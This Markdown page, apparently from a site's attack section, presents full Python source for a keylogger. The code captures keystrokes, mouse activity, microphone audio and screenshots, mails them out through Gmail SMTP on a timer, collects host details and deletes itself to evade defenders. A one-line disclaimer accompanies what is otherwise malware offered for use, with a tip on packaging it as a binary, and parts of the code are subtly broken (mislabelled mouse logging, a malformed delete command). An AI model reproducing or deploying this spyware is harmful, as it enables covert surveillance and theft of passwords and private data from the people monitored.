
---
layout: attack
title: Keylogger with sneaky features
---

<img height="150" align="left" src="/images/python-key-logger.png"> 
This Python script is an example of a keylogger, a type of surveillance technology used to monitor and record each keystroke typed on a specific computer's keyboard. This script was created to satisfy my curiosity about possibilities of a key logger in less lines of Python code. To get the maximum, it helps to create a binary out of the code using `pyinstaller`.

### Features:
1. **Key and Mouse Event Logging**: The KeyLogger class has methods to handle keyboard and mouse events. These methods log keystrokes (save_data), mouse movements (on_move), mouse clicks (on_click), and mouse scrolling (on_scroll). The logged data is appended to the log attribute of the KeyLogger instance.
2. **Data Reporting**: The report method sends the collected data via email and then clears the log.
3. **System Information Gathering**: The system_information method collects various system information such as hostname, IP address, processor, system, and machine details.
4. **Audio Recording**: The microphone method records audio for a specified number of seconds and sends the recording via email.
5. **Screenshot Capturing**: The screenshot method captures a screenshot and sends it via email.
6. **Self defense**: The keylogger deletes itself upon detection to avoid leakage of the email or collection of IoCs by a defender

Please note that using a keylogger to monitor someone without their explicit consent is illegal and unethical. This script should only be used for educational purposes or legitimate system administration tasks.

<!-- cSpell:disable -->
```python
import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move)

    def on_click(self, x, y):
        current_click = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_click)

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def microphone(self):
        fs = 44100
        seconds = 10
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        self.send_mail(email="MAIL", password="PASSWORD", message=obj)

    def screenshot(self):
        img = pyscreenshot.grab()
        self.send_mail(email="MAIL", password="PASSWORD", message=img)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is close.')

        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " +  os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print('File is close.')


email_address = "YOUR MAIL"
password = "YOUR PASSWORD"

keylogger = KeyLogger(10, email_address, password)
keylogger.run()
```
<!-- cSpell:enable -->